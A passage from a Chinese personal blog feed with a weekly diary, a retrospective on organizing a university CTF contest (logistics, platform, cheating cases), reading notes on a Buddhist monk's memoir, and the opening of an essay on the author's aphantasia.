<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W02_%e9%9a%8f%e4%be%bf%e5%8f%96%e4%b8%aa%e6%a0%87%e9%a2%98%e5%85%88_image_2.jpg" alt="|500"  /></p>
<p>早些时间，还没有护眼这一需求，但是现在已经明显感受到我的眼睛的耐久度下降了，在之后，我可能会all in 墨水屏设备，墨水屏手机，墨水屏显示器。希望最近的国产墨水屏给力一点，打破元太的垄断，把价格打下去。</p>
<h1 id="最近在读-西方哲学史讲演录">最近在读-西方哲学史讲演录</h1>
<p>很早之前就想要读一点哲学史了，高中的时候买过一本罗素的西方哲学史，但是只是翻了前面几页，甚至都还没有看完泰勒斯。后面幻想着进入大学之后读一下西方哲学史，但是这只是过去的幻想而已。</p>
<p>直到最近终于有了一点读哲学的激情，凭借三分钟热度，大致翻了一遍赵林的西方哲学史讲演录。从古希腊的自然哲学和形而上学到近代黑格尔的辩证法，只能说是大致粗看了一遍，知道了一些概念。后面又去找了一本讲现代西方哲学史的书，但是看到实用主义那里就看不下去了，三分钟热度算是结束了。之后可能会去看点逻辑学，看点思想实验。对哲学的兴趣估计会一直持续下去，只是现在没有激情了。在没有外界限制下，或者说，当我财富自由了，当我生活在乌托邦|人间天国时，我是会去读哲学的，而在想象中的理想状态下值得做的事情，在任何状态下都会是值得我去做的。</p>
<h1 id="科目三挂掉">科目三挂掉</h1>
<p>大学的第一次挂科挂在了科目三🤣。我对考驾照这一事情并没有什么热情，只是在家庭的要求以及身边的朋友的影响下报了名，甚至我将其当成一种浪费，我并没有什么买车的想法。一个僧人需要会开车吗？也许需要吧。</p>
<p>挂了之后，在回去的路上刷了一些知乎，看了一下别人挂掉科目三之后的感受，并没有什么感觉，回宿舍之后，才有了一些悲伤感，自我怀疑感，考试这种东西，太能引起中国学生的情绪了😅。当念头充满我的脑子的时候，我马上升起了，⌈越是这种时候就越是修行的时候⌋，我的念头并不是我，我需要的是让这些念头过去，把这些念头看成无意义的符号，而不是捕捉这些念头，将这些念头当成我，然后产生更多的念头，最终陷入悲伤的心境中。在当下的力量，或许是另外哪本灵修冥想类书籍中有这样的类比，天空中一直都有云飘来飘去，但是天空一直都是蓝色的。(这个类比让我的电脑桌面壁纸很长一段时间都是漂浮的流云☁️)。另外一个类比是，意识是一片湖水，当你升起一个念头的时候，就向湖中投入了一个石子，水面泛起波纹，湖水不再清澈，你想要让内心重新澄澈起来，但你认为你的念头就是你，于是你主动产生更多的念头，往湖水中投入更多的石头。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W02_%e9%9a%8f%e4%be%bf%e5%8f%96%e4%b8%aa%e6%a0%87%e9%a2%98%e5%85%88_image_3.jpg" alt="|550"  /></p>
<p>在接触佛法之后，开车时，无论是平常骑电动车还是练车的时候，都会给我带来一丝不适感。我不希望被车撞，我能够直觉的想象到被车撞之后各种层面上的痛苦。所以我开车的时候不会去撞人，会集中注意去保持正常行驶。但是我也会希望被车撞，希望史铁生笔下的必然降临的死亡节日早点到来，进行转化之后，在我开车的时候，我能够觉察到我内心的疯狂念头，虽然每次只是一闪而过，但是我觉察到了我有这样的疯狂念头，这种觉察令我不适。</p>
<p>我认同在这种情况下的念佛号行为，当你觉察到了那些疯狂的念头升起，并且将要开始造作的时候，马上默念几声阿弥陀佛，来代替疯狂念头之后将要升起的其他疯狂念头，这与功德无关，只是用一些词语来对治自己的疯狂念头而已，念哈吉米与念阿弥陀佛并没有什么区别（还是有区别的，不同的词语带来的感受是不同的）。不过这也与我的多感官心盲症有关，⌈称名念佛⌋，是通过观想佛陀的功德来构建特殊心境(色界心境），然后维持在这种心境，进而获得禅定体验的修行方式，而对我来说，念几万遍，都无法在脑海中看见什么佛陀，更不用说去构建情景，获得心境了。（这也是我最近对佛法热情消散的主要原因，绝大多数的禅定方法都不适合拥有多感官心盲症的我）</p>
<h1 id="l1uyun">l1uyun</h1>
<p>胡言乱语，就先说这些吧。下周见！</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/weekly" term="weekly" label="weekly" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[办了一场ctf校赛]]></title>
            <link href="https://l1uyun.one/posts/%E5%8A%9E%E4%BA%86%E4%B8%80%E5%9C%BActf%E6%A0%A1%E8%B5%9B/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/%E5%8A%9E%E4%BA%86%E4%B8%80%E5%9C%BActf%E6%A0%A1%E8%B5%9B/</id>
            
            
            <published>2024-12-18T20:53:50+08:00</published>
            <updated>2025-01-30T23:26:48+08:00</updated>
            
            
            <content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>最近办了一场学校的ctf校赛，这也许是我最后一次接触ctf，目前比赛算是结束了，复盘一下比赛，复盘一下我自己。</p>
<h1 id="办了一场ctf校赛">办了一场ctf校赛</h1>
<h2 id="缘起">缘起</h2>
<p>办比赛的缘起要从我莫名当上协会负责人说起，九月份去衡阳打攻防，打的过程中，上一届的会长SkyWT在qq上问我要不要当下一任会长，我答应了，回去之后忙完年审材料，换届材料之后，我就成了协会的负责人。（我估计也会这样把协会传下去），这一身份让我与办ctf校赛这一事情产生了内在联系。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e5%8a%9e%e4%ba%86%e4%b8%80%e5%9c%bactf%e6%a0%a1%e8%b5%9b_image_1.jpeg" alt="|300"  /></p>
<p>另一部分是源自带我去衡阳打攻防的学姐，在衡阳跟我说过这学期她需要办一场ctf比赛，她与学院的老师有过这方面的约定，而我对这位带我去打攻防的学姐是非常感激的。她带我去打攻防，是基于为爱发电的理念，“如果我带你去打了攻防，有了这一次攻防，你之后就有可能去带新人去打，这样我们学校做渗透的就能传下去”，这种热爱，传承的意味在一定程度上影响了我。但是与这种感染相比更多的是对学姐的感激（让我短暂远离了学校这一苦闷的秩序，以及让我中断那段时间的自我内耗）。</p>
<hr>
<p>再回忆一下让比赛办下去的外部因素，也就是’缘‘。</p>
<p>一方面是学院需要这方面的建设，在建新校区，网安系可能会独立出去啥的，因此给了比较充足的预算支持，</p>
<p>另一个外部因素是跟朋友的闲聊，聊到我们学校ctf这方面发展的不行，没什么氛围，跟那些强ctf战队的学校比不了，之后是一段不怎么愉快的交流（回忆那次闲聊，我只是<em>知道</em>是不怎么愉快的，就跟我知道1+1=2一样，只是概念上的知道有这一回事），我并不认同‘我身为会长，就最有责任最有义务去建设这玩意’，我当上会长并不是因为有一群热爱安全，热爱ctf，一起打比赛的伙伴，并不是有一个真实的信安协会，协会只在学校的记录中还存在而已，在的认知中，我只是莫名奇妙的就当上了会长（我只是莫名奇妙的来到了这个世界）</p>
<p>&lsquo;我&rsquo;并不是一个有什么领导特质的人，或者说，我并不是一个主动的，积极的，直接活着的人，我没有很强的自我感（这些否定性的特质是我能够活到现在的前提），我的自我感直到高二才显现出来，当时我将那种强烈的“我需要做一些事情，我能够做一些事情”的感觉，称作觉醒。</p>
<p>大多数时间，是世界在向我展开，是生活在经历我，我只是莫名其妙的经历那些，莫名奇妙的就成为了我，这与我的早期经历有关，与心盲症有关。</p>
<p>进入大学后，我做了一些努力，积极地说，或许改变了5%。按照修行的说法，我身上的习气依然很难消除，也许每天只有20分钟，我能够保持积极的，主动的，觉察的心态，在修行，而剩下的23小时40分钟都在复习过去旧有的习惯，强化旧有的思维模式，都在依照过去的习性造作新的业，在反向修行。</p>
<p>回到那次闲聊，闲聊中，我莫名成了最有责任要办一场比赛，来提升学校ctf氛围的的人，这种‘因为我是会长，所以我需要&hellip;’的说法对我来说是荒谬的，如果这一说法是产生于内部，有可能会鼓动到我（如果我不小心相信了我的念头）。（类比这样的说法，我们都相信自己是理性的，但是如果别人对你说，‘你要理性一点’，你会以非理性的方式应对，你的心理机制会让你对此反对的，如果你认同了，那你在这场语言权力斗争中就输了..）</p>
<p>我是一个被动的人，既然朋友都这么说了，那我就去推进一下这件事情。跟我闲聊的朋友并不知道协会的学姐跟我说过，这学期她需要办一场校赛这一信息。（也许是并不相信这一说法，不过无所谓怎么形容了，反正我回忆不起来过去发生的事情的细节）在我的视角中，推进办比赛这件事情最直接的方式就是去联系一下学姐。</p>
<p>在我联系学姐之后，这场比赛的因缘就和合了，如果没有什么更大的外部事件发生，就一定会办了。</p>
<p>类比一颗已经接近临界点的水煮蛋，哪怕在此刻促成煮鸡蛋的一些外界条件改变了，装鸡蛋的容器消失了，提供热量的火灭了，把鸡蛋放到容器里面的人暴毙了&hellip;.余热也会让煮鸡蛋这一事件彻底完成，这颗鸡蛋注定会成熟。（这是我对因缘和合这一说法最早的印象）</p>
<hr>
<h2 id="赛前">赛前</h2>
<p>办一场比赛，最麻烦的事情都在赛前。</p>
<h3 id="方案">方案</h3>
<p>由于拿了学院的预算，所以什么都需要审核。</p>
<p>拿着22年校赛的方案，更改内容，添加一点点细节，经过几个版本的迭代，勉强弄出来一个像样的方案。</p>
<h3 id="部署平台">部署平台</h3>
<p>最开始是打算使用超算中心的服务器，由于没有办比赛的经验，不清楚要租一个什么配置的服务器，在询问了探姬师傅以及结合超算中心的价格表，准备租个2核4g，20Mbps带宽的服务器，但是走完申请流程，拿到服务器之后，发现没有给公网ip，也没有给学校内网的ip，以及还需要签一个安全承诺书，不能扫描服务器，不能部署有漏洞的服务啥的，但是我们是办ctf比赛&hellip;.</p>
<p>最终选择在腾讯云上租服务器，配合双十一的卷，不到四百块钱租了一个月的轻量应用服务器。8核16g，18Mbps，月流量3500G，比赛只用了一点点，大概是3-5%的性能</p>
<p>部署平台是使用GZCTF这一开源平台，使用docker部署</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e5%8a%9e%e4%ba%86%e4%b8%80%e5%9c%bactf%e6%a0%a1%e8%b5%9b_image_2.png" alt=""  /></p>
<h3 id="出题">出题</h3>
<p>原本定了六个方向的题，web，pwn，reverse，crypto，misc，osint，kery学长还弄了一道ai题</p>
<p>由于是校内的新生赛，所以都是出的easy难度的题</p>
<p>我主要弄了web，crypto方向的题，web方向，全程使用的php出的题，因此web方向出题并没有花多少时间。</p>
<p>crypto方向，是因为没人学，我也没学过，就简单出了两个编码和一个easy_rsa。</p>
<h3 id="预热">预热</h3>
<p>由于学院那边突然就把推文给发出去了，那时候离宣讲会都还有两个星期，导致整个比赛莫名的启动了，于是kery学长建议弄几个预热题，让大家熟悉一下，也让我们主办方熟悉和测试一下比赛平台。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e5%8a%9e%e4%ba%86%e4%b8%80%e5%9c%bactf%e6%a0%a1%e8%b5%9b_image_3.png" alt=""  /></p>
<p>当时我负责的题是已经出完了，我就直接从我出的web题里面丢了几道在预热赛里面。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e5%8a%9e%e4%ba%86%e4%b8%80%e5%9c%bactf%e6%a0%a1%e8%b5%9b_image_4.png" alt=""  /></p>
<h3 id="宣讲会">宣讲会</h3>
<p>宣讲会，我在消极应对，最开始是不知道要演示些啥，后面弄了预热，那就讲讲预热题吧，我也没做什么准备，只是在宣讲会开始前一个多小时，在宿舍练习了一遍，讲了半个多小时，然后就直接过去了。</p>
<p>原本预期中，我是坐在下面，使用腾讯会议投屏，来演示的，但是由于学姐主持的时候我和她都没有反应过来，没有意识到只需要退出她电脑上的ppt，换到腾讯会议的界面就行，我就莫名奇妙的拿着电脑上去了。</p>
<p>让我站在前面，面对其他人讲，我很难讲好，一方面是缺乏练习，缺乏经历，另一方面是，对于这些内容，我并没有很强的表达分享的欲望，缺乏内在动力，所以我很难克服当众表达面临的本能阻力。</p>
<p>想象一下，几百万年以前，我还是野人的时候，走在路上，突然一束光照向我的眼睛，并且前面还有很多生物盯着我，有很多双眼睛看着我。这种情况下，我本能的就会启动战斗模式，血液流向四肢，握拳准备战斗，或者启动逃跑模式，双脚开始绷紧，准备逃跑。这时最不需要的就是思考，血液会从大脑流向其他地方，我的大脑就一片空白了。</p>
<hr>
<h2 id="赛中">赛中</h2>
<p>比赛从周六的上午九点到周天的下午五点。</p>
<h3 id="day1">day1</h3>
<p>第一天全程在当人工bot，播报比赛的一血二血三血情况，比赛开始前面半个小时，还在担心没人打，没人拿一血，不过比赛刚开始几分钟就有人解出题了，不得不说，这几个新生确实nb，不过也与大模型有关吧，我没有去测试，但是估计所有的题，都能使用chatgpt解决</p>
<p>第一天结束的时候，大部分题都被解决的差不多了。</p>
<h3 id="day2">day2</h3>
<p>第二天一觉醒来，有个学长半夜屠榜了</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e5%8a%9e%e4%ba%86%e4%b8%80%e5%9c%bactf%e6%a0%a1%e8%b5%9b_image_5.png" alt=""  /></p>
<p>以及发现有个校外✌ak了，从周六下午五点，打到周天早上七点，太肝了。</p>
<hr>
<h2 id="赛后">赛后</h2>
<h3 id="做题情况">做题情况</h3>
<p>所有的题目都被做出来了。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e5%8a%9e%e4%ba%86%e4%b8%80%e5%9c%bactf%e6%a0%a1%e8%b5%9b_image_6.png" alt=""  /></p>
<p>还有一些非预期解，例如ai那道题，找个在线的加噪点网站就能解决，或者干脆使用win自带的画图，在图像里面随便画几笔就能通过。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e5%8a%9e%e4%ba%86%e4%b8%80%e5%9c%bactf%e6%a0%a1%e8%b5%9b_image_7.png" alt="||550"  /></p>
<p>总共43个人答了签到题。。。</p>
<h3 id="作弊情况">作弊情况</h3>
<p>比赛过程中发现有提交其他人flag的，我们大部分题目都是使用的动态flag，能在后台看见哪只队伍提交了哪只队伍的flag。发现有这种情况之后，我们发了个警告，但是没起到什么作用，马上这两只队伍又出现了互相提交flag的情况，不过最后这两只队伍也没有提交wp，大概只是来玩一下的。</p>
<h3 id="审wp">审wp</h3>
<p>做出签到题的有43个人，提交wp的，只有16个，算上群里的毕业老登发的wp，总共只有18个wp，所以审wp的工作很快就完成了，没啥内容，而且除了reverse和pwn方向，其他方向都很直接，并没有很长的链子。</p>
<p>而我们pwn方向的出题人，倒是发现了一些疑点，我们开会之后，决定抽空找他们线下答辩一下。但是后面出了意外情况，就按照意外情况的处理方式去处理了。</p>
<h3 id="官方wp">官方wp</h3>
<p>原本是有计划出官方wp的，但是遇到了期末考试，我也就懒得弄了，正好老登们在群里发了官方wp，就封他们为官方wp了。</p>
<p>看了一下他们的wp，思路上差不了多少，毕竟都是easy题。</p>
<p>我出的misc方向的《网络鲨鱼》，没人尝试去连接那个mysql数据库，出题的时候没有想清楚，觉得是新生赛，就在后面又给了一个base64编码的flag，导致这道题跟另外一道流量分析的题很相似了。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e5%8a%9e%e4%ba%86%e4%b8%80%e5%9c%bactf%e6%a0%a1%e8%b5%9b_image_8.png" alt="|500"  /></p>
<h3 id="意外事件">意外事件</h3>
<p>虽然过了交wp的时间，但是之后的一两天内我还是有在翻看邮箱，结果在垃圾箱里面发现了一封异常的邮件，点进去一看是举报&hellip;..还好我有翻垃圾箱的习惯</p>
<p>这种事情只能上报了，按照指示，找了新生里面的第一名第二名谈话，两个新生态度都很好，都没有不承认，最终也是处理完了这件意外事件，取消了这两人的pwn方向成绩。</p>
<h3 id="公示成绩">公示成绩</h3>
<p>基本上是认真参与了就有奖，新生赛道，14个wp，12个奖。（他们这500赚的轻松🙄，我在衡阳，7天时间，每天9小时，最终还是拿了奖才能有500&hellip;&hellip;.）</p>
<p>高年级赛道，只有四个wp，但是有十个礼品，最终弄成大礼包送出去了。</p>
<h3 id="归档">归档</h3>
<p>在正式比赛结束之后，把比赛平台数据，题目源码，以及整个比赛用到的文档都归档了一下，放到祖传材料里面，留给下一任会长了。</p>
<hr>
<h1 id="l1uyun">l1uyun</h1>
<p><strong>草台班子</strong></p>
<p>亲自办一场比赛，让我对草台班子这一说法有了经验性的理解。在这之前，我只是听马督工讲过这一说法，只是概念上知道。</p>
<p>办完这场比赛之后，才理解了组织，秩序背后的松散拼凑、粗制滥造，这有利于我进一步对各种叙事祛魅</p>
<p><strong>小组作业？</strong></p>
<p>办这场比赛，跟完成一个课程小组作业，我没有感到有什么区别，只是时间更长，事情更多的小组作业。我并没有感知到什么团队的氛围，只是拼凑起来，来完成这样一个与ctf相关的任务，彼此之间并没有深度的联系。我并没有感受到作为一个团队来完成一件事情的感觉。</p>
<p><strong>正见，正思维</strong></p>
<p>消极/积极一点来看，我应该<em>如实观照</em>现在的氛围，而不是产生幻想，产生&rsquo;应该是什么样&rsquo;的念头。 现在的氛围就是现在的氛围，没有&rsquo;应该是什么样的氛围&rsquo;。现在的氛围背后也是无数因缘和合导致的，是无常导致的。所有的“应该是什么样”都是来源于我对无常的不明白，都是我在尝试掌控我不能掌控的东西。</p>
<p>积极/消极一点来看，我可以拥有主动性，可以去促进积极的事情发生。无常是坏事，也是好事。我需要并且能够去促进积极的因缘产生，这里的&quot;需要&quot;是因为我还有世俗的欲望，&ldquo;能够&quot;是指只需要变得比之前好5%就行，《5%的改变》是容易的，是我可以实现的。</p>
<h1 id="引用">引用</h1>
<p><a href="https://pid-blog.com/article/course-contest-experiences" target="_blank" rel="noopener nofollow noreferrer" >如何办好一场校内 CTF 赛 _ 写在 2024 网络攻防课程结课后</a></p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/l1uyun/hnu" term="l1uyun/hnu" label="l1uyun/hnu" />
                             
                                <category scheme="https://l1uyun.one/tags/sec/ctf" term="sec/ctf" label="sec/ctf" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[读书记录_我可能错了]]></title>
            <link href="https://l1uyun.one/posts/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%95_%E6%88%91%E5%8F%AF%E8%83%BD%E9%94%99%E4%BA%86/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%95_%E6%88%91%E5%8F%AF%E8%83%BD%E9%94%99%E4%BA%86/</id>
            
            
            <published>2024-11-29T13:58:31+08:00</published>
            <updated>2024-12-07T21:28:19+08:00</updated>
            
            
            <content type="html"><![CDATA[<h1 id="我可能错了">我可能错了</h1>
<h2 id="概述">概述</h2>
<p>一本很薄的回忆录。作者在26岁的时候放弃了自己的事业，去了泰国森林当僧人，在十七年之后选择了还俗，最后成为了一名冥想导师和演说家。这是他的第一本书，也是最后一本。</p>
<h2 id="作者">作者</h2>
<p>比约恩·纳提科·林德布劳（瑞典语：Björn Natthiko Lindeblad，1961年8月16日—2022年1月17日），法名纳提科·比丘（Natthiko Bhikku），是一名瑞典经济学家、讲师和佛教僧侣。</p>
<h2 id="缘起">缘起</h2>
<p>// 为什么读这本书。</p>
<p>在YouTube上看见了讲这本书的视频，提到这是一本非常真诚的书，作者描述了自己在冥想时打瞌睡，不断产生念头的冥想经历。而我对描述禅修体验的内容带有一个预置了的兴趣，所以就把这本书加入了待读列表。</p>
<h2 id="阅读感受">阅读感受</h2>
<p>// 读完之后，我的感受</p>
<p>8/10</p>
<p>我带着功利的态度，快速读完了这本书，没有什么复杂理论，是很多篇回忆性质的小短文。不少可以细细品味的地方我也没有怎么去停下来体会，但是读完之后仍然获得了“当下是如此的美好”的感受。是一本我还会再读的书，所以打个高分。</p>
<h2 id="句子摘录">句子摘录</h2>
<p>// 摘录几个高亮过的句子。</p>
<ul>
<li>一个经济学家为大公司工作的动机何在？是的──将股东们的财富最大化。这对我有什么意义？他们是谁？我可曾和任何一个股东见过面？（就算见过面，但将他们的财富最大化，为什么我得感兴趣？）</li>
<li>我有着念头，可是我的念头不代表我。</li>
<li>我喜欢和已经开始探索内在的人相处的原因就在于，他们已经发现自己大脑的紊乱，进而和自己、念头保持距离。这必然让他们变得更谦虚。而且，和这些不会老是自视甚高、把自己的信念看得很重的人相处，也会让人神清气爽。我们反倒可以因为有共同的体悟而同心：我的注意力没有完全集中，你的注意力也没有完全集中。我不是百分之百理性，你也不是百分之百理性。我偶尔会不由自主地想到疯狂的事，你也是。我对某些事情会有很离谱的情绪反应，你也一样。</li>
<li>嗨！你尽管保有自己的样子，你就是你，这真是太棒了。你不必是其他的样子，我接受你所有的习惯、任性又反常的一面、古怪的行径。你就尽管在我的世界做自己。这里有你容身的空间。</li>
<li>我可能错了。我可能错了。我可能错了。</li>
<li>身为森林僧人，就是要努力放下，然后九○％的时间又无法做到。</li>
<li>没有什么会持久。一切都是无常的。这是坏消息，但也是个好消息。</li>
<li>今天是死去的好日子。</li>
</ul>
<h2 id="重要概念">重要概念</h2>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e8%af%bb%e4%b9%a6%e8%ae%b0%e5%bd%95_%e6%88%91%e5%8f%af%e8%83%bd%e9%94%99%e4%ba%86_image_1.png" alt=""  /></p>
<ul>
<li>念头：这本书让读者感到真诚的一个很大原因是，作者描述了他的很多念头，内心言语。这是非常私密的内容。
当然念头这一概念也是作者17年森林僧人生活中感受最深的东西。当一位记者采访他，问他在这17年的修行中，学到最重要的事情是什么时，他回答：  “在关照自己的内心之后，从最寂静的内在浮现出最诚实的答案，就是‘我对自己的每个念头，再也不相信了。’”</li>
</ul>
<h2 id="l1uyun">l1uyun</h2>
<p>// 写写读完之后的体会。</p>
<p>让我的注意力再次回到了正念，前段时间对心盲症有了更加深入的理解，察觉到我的思考，想象力更加的依赖逻辑，模型，这些我过去也了解过，但是并没有很深的感受，在输出完关于心盲症的文章之后，我有了更深的体会，将注意力转向了逻辑，思维模型。这本书把我拉回了当下。</p>
<h2 id="相关链接">相关链接</h2>
<p><a href="https://zh.wikipedia.org/wiki/%e6%af%94%e7%b4%84%e6%81%a9%c2%b7%e7%b4%8d%e6%8f%90%e7%a7%91%c2%b7%e6%9e%97%e5%be%b7%e5%b8%83%e5%8b%9e" target="_blank" rel="noopener nofollow noreferrer" >比約恩·納提科·林德布勞</a></p>
<p><a href="https://www.youtube.com/watch?v=WSwDwrDt3FE" target="_blank" rel="noopener nofollow noreferrer" >https://www.youtube.com/watch?v=WSwDwrDt3FE</a></p>
<p><a href="https://zh.annas-archive.org/md5/d68b51911d7c90e2db9baac95de15c9c" target="_blank" rel="noopener nofollow noreferrer" >https://zh.annas-archive.org/md5/d68b51911d7c90e2db9baac95de15c9c</a></p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/l1uyun/reading" term="l1uyun/reading" label="l1uyun/reading" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[患有心盲症是一种怎样的体验]]></title>
            <link href="https://l1uyun.one/posts/%E6%82%A3%E6%9C%89%E5%BF%83%E7%9B%B2%E7%97%87%E6%98%AF%E4%B8%80%E7%A7%8D%E6%80%8E%E6%A0%B7%E7%9A%84%E4%BD%93%E9%AA%8C/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/%E6%82%A3%E6%9C%89%E5%BF%83%E7%9B%B2%E7%97%87%E6%98%AF%E4%B8%80%E7%A7%8D%E6%80%8E%E6%A0%B7%E7%9A%84%E4%BD%93%E9%AA%8C/</id>
            
            
            <published>2024-11-21T14:17:34+08:00</published>
            <updated>2024-12-08T19:58:56+08:00</updated>
            
            
            <content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>在我知道“心盲症”这个概念后，我便开始了一场自我探索之旅。在网上检索了这一主题的视频，文章，英文书籍，与亲人，朋友交流之后，我越发认识到心盲症,准确来说是多感官想象障碍，是我生命中的一个关键的底层机制。</p>
<h1 id="患有心盲症是一种怎样的体验">患有心盲症是一种怎样的体验</h1>
<p>在我知道心盲症这一概念之前，我一直都认为“想象”是一个比喻，大一的心理健康课，让我们做一个放松训练，想象自己处于大自然中，想象自己喜欢的动物出现在你的眼前。我认为这是一个不可能完成的事情。闭上眼睛，难道不是漆黑一片吗，怎么可能想象出来图像。</p>
<h2 id="什么是心盲症">什么是心盲症</h2>
<p>心盲症是指无法在脑海中进行成像这一症状，也叫做想象障碍，心盲症这一概念在1800年代就已经被记录了，但是直到2015年才被命名。[1]网络上有一张传播广泛的图片，集中注意力，&ldquo;想象&quot;一个苹果，这对你来说会是什么。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e6%82%a3%e6%9c%89%e5%bf%83%e7%9b%b2%e7%97%87%e6%98%af%e4%b8%80%e7%a7%8d%e6%80%8e%e6%a0%b7%e7%9a%84%e4%bd%93%e9%aa%8c_image_1.png" alt=""  /> [2]</p>
<p>绝大多数人应该都是图2，图3的水平，能够在脑海中看见苹果的图像，但是对有心盲症的人来说，脑子里什么图像都没有，我闭上眼睛，从来都是一片漆黑。</p>
<p>对我来说，想象一个苹果，只是会有苹果的概念出现在我的脑子里面，类似文字，没有任何细节。在与拥有正常的心像能力的人交流过后，了解到，在被要求想象一个苹果的时候，他们的脑子里会先浮现苹果的图像，然后再从图像中辨认出来这是苹果。</p>
<p>再介绍一下另外一个心盲症测试[3]</p>
<blockquote>
<p>集中注意力，想象有一个桌子，桌子上面有一个球，有一个人走了过来，碰到了球，球掉到了地上。
请问球是什么颜色的，桌子是什么形状的。</p></blockquote>
<p>对于拥有正常心象能力的人，想象这一事件，回答问题的时候，可以描述出来很多文字上没有的细节的，但是对于想象障碍的人来说，集中注意力想象这件事情，就只有文字包含的这些信息，桌子是什么形状，undefined，球是什么颜色？undefined。这些信息对我来说都是还没有未被定义的，除了文字中描述的，我不能得到更多的信息。</p>
<p>我在想象上面这一过程的时候，脑海有的只是，&ldquo;桌子&rdquo;，&ldquo;球在桌子上&rdquo;，&ldquo;有人走过来&rdquo;，&ldquo;碰到了球&rdquo;，&ldquo;球掉到地上&quot;这些概念和描述。我的脑海里确实是在想象桌子，球这些事物，但是不能在脑海里面看到一个桌子，一个球。在想象之后，问我球是什么颜色，我完全无法回答，我脑海的中想象的&quot;球&quot;是一个抽象层次很高的描述，没有任何细节。</p>
<hr>
<h3 id="不止是视觉">不止是视觉</h3>
<p>心盲症不止只在视觉方面起作用，在aphantasia network这一网站，以及我正在阅读的Aphantasia Experiences, Perceptions, and Insights (Alan Kendle)书籍中，有大量的心盲症者表示自己不仅仅是不能进行视觉想象，在其他感官的想象上也存在障碍。</p>
<p>对于自己来说，我没法主动去想象视觉，听觉，触觉，味觉，嗅觉，痛觉，运动等感官。当我发现这些的时候，我非常的惊讶。在此之前，我一直认为”想象“都只是一种比喻，并不会有什么真的感官体验。这些感官想象的缺失对我的影响，我会在后面尝试描述一下。</p>
<h3 id="什么导致了心盲症">什么导致了心盲症</h3>
<p>心盲症大多都是先天的，也有极少数是脑部疾病，手术导致的。</p>
<p>心盲症的具体成因我并不清楚学界是否已经有定论，但是在查阅的资料中表明，这与大脑中的海马体和视觉皮层等区域有关，海马体在记忆形成过程中充当大脑的缓冲区，支持自传体记忆和视觉想象力。视觉皮层负责处理和整合大脑中的视觉信息。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e6%82%a3%e6%9c%89%e5%bf%83%e7%9b%b2%e7%97%87%e6%98%af%e4%b8%80%e7%a7%8d%e6%80%8e%e6%a0%b7%e7%9a%84%e4%bd%93%e9%aa%8c_image_2.png" alt="|500"  /></p>
<p>在心盲症患者的大脑中，海马体的激活程度较低，海马体与视觉皮层之间的<strong>连接部分</strong>与想象力没有相关性，而对于没有心盲症的人来说，这部分的连接与想象力是相关的，也就是说在想象的时候，这部分连接是被激活的。[4]</p>
<h3 id="正态分布">正态分布</h3>
<p>在检索心盲症的时候，看见了<strong>超幻症</strong>（或者叫过度幻想症），与心盲症完全相反的极端情况。超幻症者可以在内心构建一个非常具体的，丰富的，甚至接近现实的感官世界，常常会因此，而对现实和想象不是很能分得清。</p>
<p>对于大多数人而言，想象力就介于这两者中间，大部分人都有一定的视觉想象能力，程度从上面苹果那张图的图4到图2变化，拥有几项视觉之外的其他感官的想象能力。</p>
<p>想象力是一个谱系，呈现正态分布，极端情况很少，大多都处在中间。（大量随机的个体汇聚在一起，最终呈现出来正态分布，这好像叫做中心极限定理。）
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e6%82%a3%e6%9c%89%e5%bf%83%e7%9b%b2%e7%97%87%e6%98%af%e4%b8%80%e7%a7%8d%e6%80%8e%e6%a0%b7%e7%9a%84%e4%bd%93%e9%aa%8c_image_3.png" alt=""  /></p>
<h2 id="我是如何发现我是心盲症的">我是如何发现我是心盲症的</h2>
<p>缘起：知道心盲症这一概念，是因为当时我在了解精神分析，心理学这方面的知识，偶然间在国外的论坛中看到了tupla这一概念，然后在百度帖吧中找到tupla吧，tupla，指的是在自己的脑海中主动创造另外一个意识。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e6%82%a3%e6%9c%89%e5%bf%83%e7%9b%b2%e7%97%87%e6%98%af%e4%b8%80%e7%a7%8d%e6%80%8e%e6%a0%b7%e7%9a%84%e4%bd%93%e9%aa%8c_image_4.png" alt="|500"  /></p>
<p>我对于这些超常的体验，我是愿意相信的。（当时的我只是一种直觉上的相信）</p>
<blockquote>
